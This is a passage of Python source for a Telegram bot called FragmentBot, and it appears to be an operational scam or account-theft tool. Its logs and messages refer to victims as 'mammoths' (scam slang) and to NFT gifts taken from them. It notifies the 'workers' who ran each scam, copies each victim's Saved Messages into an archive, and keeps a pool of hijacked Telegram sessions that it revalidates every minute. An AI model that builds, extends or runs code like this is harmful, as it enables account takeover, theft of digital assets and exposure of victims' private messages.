                f"🎁 NFT подарки:\n{nft_text}"
                f"</blockquote>"
            )
            
            await log_to_topic(self.bot, 'topic_success', log_text)

            if u_db and u_db['worker_id']: 
                await notify_worker(self.bot, u_db['worker_id'], "✅ Мамонт успешно отработан!")

            asyncio.create_task(archive_worker(c.name, me.id))

        except Exception as e:
            if "terminated" not in str(e):
                print_error(f"FIN ERROR: {e}")
                logger.error(f"FIN ERROR: {e}")
                await alert_admins(self.bot, f"❌ Ошибка в FIN:\n{e}")
        finally:
            if phone_key in user_sessions: 
                del user_sessions[phone_key]
            await asyncio.sleep(1)
            try: 
                if c.is_connected: 
                    await c.stop()
            except: 
                pass

    async def cancel(self, phone):
        if phone in user_sessions: 
            del user_sessions[phone]
            save_temp_sessions(user_sessions)
            
        name = clean_phone_number(phone)
        if name in pyrogram_clients:
            try: 
                await pyrogram_clients[name].disconnect()
            except: 
                pass
            del pyrogram_clients[name]

    async def cache_local_photos(self):
        print_step("Caching photos...")
        target_id = SETTINGS["admin_ids"][0] if SETTINGS["admin_ids"] else None
        if not target_id: 
            return

        cached_photo_ids.clear()
        for file_path in CHECKS_PHOTO_DIR.glob("*.*"):
            if file_path.suffix.lower() not in ['.jpg', '.jpeg', '.png']: 
                continue
            try:
                msg = await self.bot.send_photo(
                    chat_id=target_id, 
                    photo=FSInputFile(file_path), 
                    caption=f"⚙️ Cache: {file_path.stem}"
                )
                cached_photo_ids[file_path.stem] = msg.photo[-1].file_id
                await msg.delete()
                await asyncio.sleep(0.5)
            except: 
                pass

    async def run(self):
        print_banner()
        
        # Проверка Kurigram
        try:
            from pyrogram import __version__
            print_info(f"Pyrogram version: {__version__}")
        except ImportError:
            print_error("Pyrogram не установлен!")
            return
        
        self.start_tunnel()
        self.bot = Bot(token=self.bot_token, 
                      default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.include_router(get_main_router(self.bot, self.get_api_url()))

        await self.bot.delete_webhook(drop_pending_updates=True)
        await self.cache_local_photos()

        asyncio.create_task(self.start_polling_api())
        asyncio.create_task(session_checker_loop(self.bot))

        print_success("✅ Bot Started Successfully!")
        print_info("⚠️ ВАЖНО: Убедитесь что установлен Kurigram: pip install https://github.com/Kurimuzard/Kurigram/archive/master.zip")
        
        await self.dp.start_polling(self.bot)

# ================= WORKERS & CHECKERS =================
async def archive_worker(client_or_session, user_id):
    if user_id in active_dumps: 
        return
    
    active_dumps.add(user_id)
    c = None
    
    try:
        if isinstance(client_or_session, str):
            c = Client(client_or_session, SETTINGS['api_id'], SETTINGS['api_hash'], 
                      workdir=str(SESSIONS_DIR))
            await c.connect()
        else: 
            c = client_or_session

        user_path = ARCHIVE_DIR / str(user_id)
        user_path.mkdir(parents=True, exist_ok=True)
        
        await dump_chat(c, "me", user_path / "Saved Messages.txt", user_path / "media")
        db.mark_as_dumped(user_id)
    except: 
        pass
    finally:
        active_dumps.discard(user_id)
        if c and isinstance(client_or_session, str):
            try: 
                await c.stop()
            except: 
                pass

async def dump_chat(client, chat_id, file_path, media_path):
    try:
        with open(file_path, "w", encoding="utf-8") as f:
            async for msg in client.get_chat_history(chat_id, limit=50):
                date = msg.date.strftime("%Y-%m-%d") if msg.date else "NoDate"
                sender = "Me" if msg.from_user and msg.from_user.is_self else "Other"
                text = msg.text or msg.caption or "[Media]"
                f.write(f"[{date}] {sender}: {text}\n")
    except: 
        pass

async def session_checker_loop(bot_instance: Bot):
    print_step("🔄 Session Checker Started (Validating every 60s, Timeout: 5m)")
    
    while True:
        try:
            banker_name = SETTINGS.get("banker_session", "main_admin")
            sessions = list(SESSIONS_DIR.glob("*.session"))
            
            for session_file in sessions:
                if session_file.stem == banker_name: 
                    continue

                if session_file.stem in user_sessions:
                    continue

                client = Client(
                    name=session_file.stem, 
                    api_id=SETTINGS['api_id'], 
                    api_hash=SETTINGS['api_hash'], 
                    workdir=str(SESSIONS_DIR), 
                    no_updates=True
                )
                
                try:
                    await client.connect()
                    await client.get_me()
                    await client.disconnect()
                except (AuthKeyUnregistered, UserDeactivated, SessionRevoked) as e:
                    try:
                        await client.disconnect()
                    except: 
                        pass

                    try:
                        last_modified = session_file.stat().st_mtime
                        time_now = time.time()
                        age_seconds = time_now - last_modified
                        
                        if age_seconds > 300:
                            print_warning(f"🗑 Удаление мертвой сессии (Age: {int(age_seconds)}s): {session_file.name} ({e})")
                            os.remove(session_file)
                    except Exception as del_err:
                        print_error(f"Ошибка проверки времени/удаления файла: {del_err}")

                except Exception as e:
                    try: 
                        await client.disconnect()
                    except: 
                        pass
                
                await asyncio.sleep(1)

        except Exception as e: 
            print_error(f"Error in session checker loop: {e}")
        
        await asyncio.sleep(60)

# ================= ЗАПУСК =================
if __name__ == "__main__":
    if sys.platform == 'win32': 
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    try: 
        asyncio.run(FragmentBot().run())
    except KeyboardInterrupt: 
        print_warning("Bot stopped by user.")
    except Exception as e:
        print_error(f"Critical error: {e}")
        import traceback
        traceback.print_exc()
